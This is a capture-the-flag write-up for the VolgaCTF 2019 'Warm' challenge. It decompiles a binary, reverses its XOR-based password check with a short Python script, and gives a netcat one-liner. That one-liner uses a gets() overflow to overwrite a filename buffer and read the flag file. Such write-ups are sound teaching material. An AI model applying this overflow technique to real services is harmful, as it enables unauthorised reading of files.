## Warm
### Category : PWN

We are given a binary and a connection

    nc warm.q.2019.volgactf.ru 443

On decompiling with Ghidra, some functions that seem interesting

```
undefined4 FUN_00010788(byte *pbParm1)

{
  size_t sVar1;
  undefined4 uVar2;
  
  sVar1 = strlen((char *)pbParm1);
  if (sVar1 < 0x10) {
    uVar2 = 1;
  }
  else {
    if (((((*pbParm1 == 0x76) && ((pbParm1[1] ^ *pbParm1) == 0x4e)) &&
         ((pbParm1[2] ^ pbParm1[1]) == 0x1e)) &&
        ((((pbParm1[3] ^ pbParm1[2]) == 0x15 && ((pbParm1[4] ^ pbParm1[3]) == 0x5e)) &&
         (((pbParm1[5] ^ pbParm1[4]) == 0x1c &&
          (((pbParm1[6] ^ pbParm1[5]) == 0x21 && ((pbParm1[7] ^ pbParm1[6]) == 1)))))))) &&
       (((pbParm1[8] ^ pbParm1[7]) == 0x34 &&
        ((((((pbParm1[9] ^ pbParm1[8]) == 7 && ((pbParm1[10] ^ pbParm1[9]) == 0x35)) &&
           ((pbParm1[0xb] ^ pbParm1[10]) == 0x11)) &&
          (((pbParm1[0xc] ^ pbParm1[0xb]) == 0x37 && ((pbParm1[0xd] ^ pbParm1[0xc]) == 0x3c)))) &&
         (((pbParm1[0xe] ^ pbParm1[0xd]) == 0x72 && ((pbParm1[0xf] ^ pbParm1[0xe]) == 0x47)))))))) {
      uVar2 = 0;
    }
    else {
      uVar2 = 2;
    }
  }
  return uVar2;
}
```
Cracking the password seems obvious

The following script did it.

```
input =[0x76,0x4e, 0x1e, 0x15, 0x5e, 0x1c, 0x21, 1, 0x34, 7, 0x35, 0x11, 0x37, 0x3c, 0x72, 0x47]
passwd = chr(input[0])
last = input[0]
for i in range(1,len(input)):
    val = last ^ input[i]
    passwd=passwd+chr(val)
    last = val

print(passwd)
```
we get ``` v8&3mqPQebWFqM?x ``` as the password.

lets connect via netcat 
```
Hi there! I've been waiting for your password!
v8&3mqPQebWFqM?x
Seek file with something more sacred!
```
Gotta find some other vulns
```

undefined4 FUN_000109ec(void)

{
  int __c;
  FILE *__stream;
  char acStack220 [100];
  char acStack120 [100];
  int local_14;
  
  local_14 = __stack_chk_guard;
  setvbuf(stdout,(char *)0x0,2,0);
  while( true ) {
    while( true ) {
      FUN_000108f0(acStack120);
      puts("Hi there! I\'ve been waiting for your password!");
      gets(acStack220);
      __c = FUN_00010788(acStack220);
      if (__c == 0) break;
      FUN_00010978(1,0);
    }
    __stream = fopen(acStack120,"rb");
    if (__stream != (FILE *)0x0) break;
    FUN_00010978(2,acStack120);
  }
  while (__c = _IO_getc((_IO_FILE *)__stream), __c != -1) {
    putchar(__c);
  }
  fclose(__stream);
  if (local_14 == __stack_chk_guard) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
In `FUN_00010788` only a lower bound on the password is checked, the vulnerability could be a Buffer Overflow

In `FUN_000109ec` we can see that, we can overwrite the buffer where file name is stored.
So, we need a file name, 

According to `Seek file with something more sacred!`, File name could be `sacred`

The password input buffer is 100 bytes, the password is 16 Bytes. so we overflow the rest with 84*A

Final exploit

```
python -c "print('v8&3mqPQebWFqM?x'+'A'*84+'sacred');" | nc warm.q.2019.volgactf.ru 443 
```

We get the flag

``` 
VolgaCTF{1_h0pe_ur_wARM_up_a_1ittle} 
```